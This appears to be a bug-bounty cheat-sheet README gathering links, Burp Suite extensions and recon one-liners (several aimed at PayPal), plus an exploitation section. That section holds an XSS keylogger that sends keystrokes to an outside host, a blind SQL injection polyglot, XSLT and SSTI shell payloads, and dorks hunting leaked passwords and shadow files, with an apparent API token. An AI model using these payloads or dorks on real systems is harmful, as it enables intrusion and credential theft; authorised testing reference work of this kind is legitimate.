<center><b>CHEAT SHEET</b></center>

<hr>

**PortSwigger official XSS cheet sheet**

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

<details>
  <summary>Table of Contents</summary>

- > Event handlers
   	- > No user interaction
    - > User interaction required
- > Consuming tags
- > File upload attacks
- > Restricted characters
- > Frameworks
- > Protocols
- > Other useful attributes
- > Special tags
- > Encoding
- > Obfuscation
- > Client side template injection
   	- > VueJS reflected
   	- > AngularJS sandbox escapes reflected
   	- > AngularJS sandbox escapes DOM
   	- > AngularJS CSP bypasses
- > Scriptless attacks
- > Polyglots
- > WAF bypass global objects
- > Content types
- > Response content types
- > Impossible labs
- > Prototype pollution
- > Classic vectors (XSS crypt)
</details>
<hr>

<hr>

**Cheet Sheet By [sysbraykr](https://id.linkedin.com/company/sysbraykr)**

https://www.linkedin.com/pulse/burp-suite-cheatsheet-bug-hunting-sysbraykr-fdxwc
<details>
  <summary>Burp Suite Extensions for Bug Hunting</summary>

>**Active Scan++**

Enhances Burp's native scanner by adding more active scan rules, particularly for security misconfigurations and vulnerabilities that are often overlooked.
How to Use:Download from BApp Store.Right-click on a request and select "Do Active Scan++".View results in the Scanner tab.
>**Retire.js**

Automatically identifies outdated JavaScript libraries in web applications.
How to Use:Install from BApp Store.Use the "Scanner" tab or "Logger" tab to detect vulnerable JS libraries.Integrates into passive scanning.
>**Param Miner**

Automatically mines hidden HTTP parameters which can lead to vulnerable endpoints or features.
How to Use:Right-click a request and choose "Guess hidden parameters."Monitors the parameters in the HTTP history and suggests any hidden ones.
>**Logger++**

Enhanced logging for HTTP requests and responses, ideal for analyzing large traffic in real-time.
How to Use:Install from BApp Store.Activate in the Logger++ tab.Use filters to track specific types of traffic for investigation.
>**Collaborator Everywhere**

Automatically injects Burp Collaborator payloads into all parts of requests to find out-of-band vulnerabilities such as SSRF, DNS rebinding, etc.
How to Use:Download from BApp Store.Enable the extension in the Extensions tab.Burp will automatically inject Collaborator payloads into requests, and you can track results in the Collaborator tab.
>**Turbo Intruder**
 
Fast and flexible brute-forcing tool for targeting specific endpoints and parameters.
How to Use:Install from the BApp Store.Right-click a request and choose "Send to Turbo Intruder".Use custom Python scripts for advanced brute-force strategies.

<details>
  <summary>OneLiner</summary>

**fuff**
```bash
ffuf -u http://target.com/FUZZ -w /path/to/wordlist.txt -x http://127.0.0.1:8080        
```
```bash
subfinder -d target.com | while read sub; do curl -x http://127.0.0.1:8080 "http://$sub"; done
```
```bash
echo target.com | waybackurls | while read url; do curl -x http://127.0.0.1:8080 "$url"; done
```
```bash
cat urls.txt | qsreplace '"><script>alert(1)</script>' | while read url; do curl -x http://127.0.0.1:8080 "$url"; done
```
```bash
cat urls.txt | gf xss | while read url; do curl -x http://127.0.0.1:8080 "$url"; done
```
```python
import requests 
# Burp Suite API URL (assuming it's running on localhost:8080) 
burp_api_url = "http://127.0.0.1:8080/burp/send-to-intruder" 
# Example URL to test 
url = "http://target.com/vulnerable_endpoint" 
# Send the URL to Burp's Intruder tool via the API 
response = requests.post(burp_api_url, json={"url": url}) print(f"Sent {url} to Burp Suite Intruder: {response.status_code}")        
```
</details>

</details>
<hr>

<hr>

**Cheet Sheet By [m0chan](https://m0chan.github.io)**

https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html

<details>
   <summary>OneLiner</summary>

**Pull Root Subdomains from Final.txt**
```bash
cat final | rev | cut -d . -f 1-3 | rev | sort -u | tee root.subdomainss
```
```bash
cat 20170417-fdns.json.gz | pigz -dc | grep ".target.org" | jq`
```
**subdomain-enum from various sources**
```bash
# https://github.com/yamakira/assets-from-spf
python assets_from_spf.py --help
```
```bash
# https://github.com/gwen001/github-search/blob/master/github-subdomains.py   
python3 $Tools/github-subdomains.py -d paypal.com -t
```
**Reverse DNS Lookups on List of IP’s**
```bash
prips 173.0.84.0/24 | hakrevdns 

173.0.84.110	he.paypal.com.
173.0.84.109	twofasapi.paypal.com.
173.0.84.114	www-carrier.paypal.com.
173.0.84.77	twofasapi.paypal.com.
173.0.84.102	pointofsale.paypal.com.
173.0.84.104	slc-a-origin-pointofsale.paypal.com.
173.0.84.111	smsapi.paypal.com.
173.0.84.203	m.paypal.com.
173.0.84.105	prm.paypal.com.
173.0.84.113	mpltapi.paypal.com.
173.0.84.8	ipnpb.paypal.com.
173.0.84.2	active-www.paypal.com.
173.0.84.4	securepayments.paypal.com.
```
**Certificate Transparency Logs**
```bash
python3 $BugBounty crt.sh domain.com
```
**Subdomain Brute Force**
```bash
cat domains.txt | dnsgen - | massdns -r /path/to/resolvers.txt -t A -o J --flush 2>/dev/null
```
**Find HTTP/HTTPS Servers with nMap and Filtering**
```bash
sudo nmap -sS -p 80,443 -iL List.txt -oA m0chan.xml
```
```python
import xmltree
def removeHostname():
   for host in root.iter('host'):
        for elem in host.iter():
            if 'name' in elem.attrib and elem.attrib['name'] == 'ISP_redir_site':
                root.remove(host)
tree.write('output.xml')
```
**Pass HTTProbe Results to EyeWitness**
```bash
cp http.servers $Tools
$Tools/EyeWitness/eyewitness.py --web -f http.servers
```
**Pass All Subdomains too S3 Scanner**
```bash
python $Tools/S3Scanner/s3scanner.py -l domains.resolved -o buckets.txt
-d # flag will dump all open buckets locally
# If you find open buckets you can run the useful bash look to enumerate content
for i in $(cat buckets.txt); do aws s3 ls s3://$i; done;
# This will require basic auth key/secret which you can get for free from AWS
```
**ASNLookup**
```bash
python asnlookup.py -o <Organization>
```
**Find Organistations ASN’s**
```bash
amass intel -org paypal
1449, PAYPAL-CORP - PayPal
17012, PAYPAL - PayPal
26444, PAYDIANT - PayPal
59065, PAYPALCN PayPal Network Information Services (Shanghai) Co.
206753, PAYPAL-
```
**Find IPv4 Address Space from ASN**
```bash
https://bgp.he.net/ASNNumberHere#_prefixes
https://bgp.he.net/AS17012#_prefixes
```
**Parse CIDR from ASN Lookup too AMass Enum**
```bash
amass enum -d paypal.com -cidr 64.4.240.0/21
```
```bash
# https://github.com/ghostlulzhacks/crawler/tree/master

python3 $Tools/crawler/crawler.py -d https://paypal.com -l 2
```
**Commoncrawl One Liner**
```bash
curl -sL http://index.commoncrawl.org | grep 'href="/CC'  |  awk -F'"' '{print $2}' | xargs -n1 -I{} curl -sL http://index.commoncrawl.org{}-index?url=http://yahoo.com* |  awk -F'"url":\ "' '{print $2}' | cut -d'"' -f1 | sort -u | tee domain.txt
```
**Common Crawl Data**
```bash
# https://github.com/ghostlulzhacks/commoncrawl
python3 $Tools/commoncrawl/cc.py -d paypal.com
```
**Get All Subdomain HTTP Headers & Responses**
```bash
#!/bin/bash
mkdir headers
mkdir responsebody
CURRENT_PATH=$(pwd)
for x in $(cat $1)
do
        NAME=$(echo $x | awk -F/ '{print $3}')
        curl -X GET -H "X-Forwarded-For: evil.com" $x -I > "$CURRENT_PATH/headers/$NAME"
        curl -s -X GET -H "X-Forwarded-For: evil.com" -L $x > "$CURRENT_PATH/responsebody/$NAME"
done
```
**Finding Hidden Endpoints from Scraped JS Files**
```bash
#!/bin/bash
#looping through the scriptsresponse directory
mkdir endpoints
CUR_DIR=$(pwd)
for domain in $(ls scriptsresponse)
do
        #looping through files in each domain
        mkdir endpoints/$domain
        for file in $(ls scriptsresponse/$domain)
        do
                ruby ~/relative-url-extractor/extract.rb scriptsresponse/$domain/$file >> endpoints/$domain/$file 
        done
done
```
**PORT Scan**
```bash
cat hosts.txt | aquatone -ports 80,443,3000,3001
```
**Tech**
```
https://github.com/vincd/wappylyzer
```
```bash
# Awesome script to detect if your target is protected behind an XSS before you started launching payloads.
waf00f $(cat targets.txt) --findall
```
**Github Dorking**
```bash
# https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt
```
**GitMiner**
```bash
$:> python3 gitminer-v2.0.py -q 'filename:wp-config extension:php FTP_HOST in:file ' -m wordpress -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4 -o result.txt

$:> python3 gitminer-v2.0.py --query 'extension:php "root" in:file AND "gov.br" in:file' -m senhas -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4

$:> python3 gitminer-v2.0.py --query 'filename:shadow path:etc' -m root -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4

$:> python3 gitminer-v2.0.py --query 'filename:configuration extension:php "public password" in:file' -m joomla -c pAAAhPOma9jEsXyLWZ-16RTTsGI8wDawbNs4

Full List of Dorks Here
# https://github.com/UnkL4b/GitMiner
```
**Finding Subdomains That Resolve to Internal IP**
```bash
cat domains.txt | while read domain; do if host -t A "$domain" | awk '{print $NF}' | grep -E '^(192\.168\.|172\.1[6789]\.|172\.2[0-9]\.|172\.3[01]\.|10\.)' &>/dev/null; then echo $domain; fi; done
```

# Exploitation
**Unauthenticated Elastic Search**
```bash
# ES is a document-oriented database designed to store, retrieve, and manage document-oriented or semi-structured data"
# Elastic Search has a HTTP Server running on Port 9200 that can be used to query the database and sometimes it supports unauthenticated access.
# We can find these servers by scanning for Port 9200 or the Shodan Dork below.
port:"9200" elastic
```
**Unauthenticated Docker API**
```bash
# Similar to Elastic Search, Docker has some servies that can be exposed that may be an easy win. Mainly when you install docker on system it will pose an API on your localhost on Port 2375. As its on localhost by default you cant interact however in certain instances this is changed and it is available.
Shodan Dorks come in Handy here
port:"2375" docker
product:docker
# If you find a endpoint you can verifiy that its vulnerable by making a GET request too `/version`
# From here you can connect with the CLI version of Docker
docker -H ip:port ps
```
**Unauthenticated Kubernetes API**
```bash
product:"kubernetes"
port:"10250"

wscat -c “https://<DOMAIN>:<PORT>/<Location Header Value>” –no-check
```
**Unauthenticated odoo Manager**
```bash
http.status:200 http.component:odoo port:8069

# After finding instances go to /web/database/manager most of the time there is either no password or it's "admin"
# Or 
# simply port scan for 8069
```
**Unauthenticated Jenkins Instance**
```bash
# check if this header is allowed with anonymous user
X-You-Are-Authenticated-As: anonymous
```
**SSTI**
```bash
tplmap.py --os-shell -u 'http://www.target.com/page?name=John'

tplmap.py -u 'http://www.target.com/page?name=John'
```
**XSS**
```bash
# Easy JavaScript Keylogger with IMG Tags. Useful for XSS with Login Forms present.
<img src=x onerror='document.onkeypress=function(e){fetch("http://bugcrowd.com/?k="+String.fromCharCode(e.which))},this.remove();'>
```
**SQLi**
```bash
# MySqli
IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
```
**XSLT Injection**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
	<body>
		<xsl:text>xsl:vendor = </xsl:text><xsl:value-of select="system-property('xsl:vendor')"/><br/>
		<xsl:text>xsl:version = </xsl:text><xsl:value-of select="system-property('xsl:version')"/><br/>
	</body>
</html>
```
**Injecting in PHP**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
	<body>
		<xsl:value-of name="bugbounty" select="php:function('phpinfo')"/>
	</body>
</html>
```
</details>

<hr>

<hr>

**Cheat Sheet By [bughunter-handbook](https://gowthams.gitbook.io/bughunter-handbook/checklists)**

<details>
<summary><b>Cheet Sheet Links</b></summary>

https://github.com/hahwul/WebHackersWeapons
https://medium.com/@cc1h2e1/bug-bounty-check-list-by-c1-2beb7ae3c116
https://github.com/KathanP19/HowToHunt
https://github.com/Voorivex/pentest-guide
https://github.com/heilla/SecurityTesting
Bugbounty cheatsheet - Mohammed Adam - Link
https://github.com/Fawadkhanfk/Check-List-
</details>

<hr>

<hr>

**[My Cheet Sheet](/MY_CHEET_SHEET.md)**
<hr>